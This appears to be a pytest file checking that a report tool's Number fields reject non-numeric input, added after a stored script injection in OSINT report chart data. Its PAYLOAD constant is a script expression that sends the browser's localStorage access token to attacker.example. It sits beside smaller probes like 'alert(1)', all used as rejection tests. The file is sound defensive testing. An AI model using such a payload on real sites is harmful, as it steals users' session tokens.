"""A Number field of a report stores numbers only.

The form's number input already sends nothing else, but the API stored any text, and templates
print these values where a number is expected: the "Incidents" counts of the OSINT report become
chart data inside a script, where a stored expression ran in the browser of whoever previewed
the product. Core tests have no database: the report item and the session are stand-ins.
"""

from __future__ import annotations

import types

import pytest
from model import report_item as report_item_module
from model.report_item import ReportItem, number_value_problem
from shared.schema.attribute import AttributeType

USER = types.SimpleNamespace(id=3, name="Analyst")
PAYLOAD = "location=`//attacker.example/?t=`+encodeURIComponent(localStorage.ACCESS_TOKEN)"


@pytest.mark.parametrize("value", ["0", "7", "-3", "+3", "12.5", "12,5", " 42 ", "", None])
def test_numbers_and_empty_values_are_stored(value: object) -> None:
    assert number_value_problem(AttributeType.NUMBER, "Incidents", value) is None


@pytest.mark.parametrize(
    "value",
    [PAYLOAD, "alert(1)", "1;alert(1)", "1e5", "0x10", "NaN", "Infinity", "1 000", "1.", "--1", "seven", 7, ["7"]],
)
def test_anything_else_is_refused_with_the_field_named(value: object) -> None:
    assert number_value_problem(AttributeType.NUMBER, "Incidents", value) == "Incidents: the value must be a number"


@pytest.mark.parametrize("attribute_type", [AttributeType.STRING, AttributeType.TEXT, None])
def test_other_field_types_are_not_checked(attribute_type: object) -> None:
    assert number_value_problem(attribute_type, "Comment", PAYLOAD) is None


@pytest.fixture
def stored(monkeypatch: pytest.MonkeyPatch) -> types.SimpleNamespace:
    """A report item with one Number field; the session records commits."""
    group_item = types.SimpleNamespace(title="Incidents", attribute=types.SimpleNamespace(type=AttributeType.NUMBER))
    attribute = types.SimpleNamespace(
        id=5,
        value="4",
        value_description="",
        version=3,
        last_updated=None,
        user=None,
        attribute_group_item=group_item,
    )
    report_item = types.SimpleNamespace(id=1, language=None, title="Unchanged", attributes=[attribute], update_cpes=lambda: None)
    recorded = types.SimpleNamespace(attribute=attribute, report_item=report_item, commits=0)

    def commit() -> None:
        recorded.commits += 1

    session = types.SimpleNamespace(get=lambda _cls, _id: report_item, refresh=lambda *_args, **_kwargs: None, commit=commit)
    monkeypatch.setattr(report_item_module.db, "session", session)
    return recorded


def test_an_update_with_a_non_number_is_refused_and_writes_nothing(stored: types.SimpleNamespace) -> None:
    data = {"update": True, "attribute_id": 5, "attribute_value": PAYLOAD, "title": "Changed in the same request"}

    modified, data = ReportItem.update_report_item(1, data, USER)

    assert modified is False
    assert data["error"] == "Incidents: the value must be a number"  # the API answers 400 with it
    assert stored.attribute.value == "4"
    assert stored.attribute.version == 3
    assert stored.report_item.title == "Unchanged"
    assert stored.commits == 0
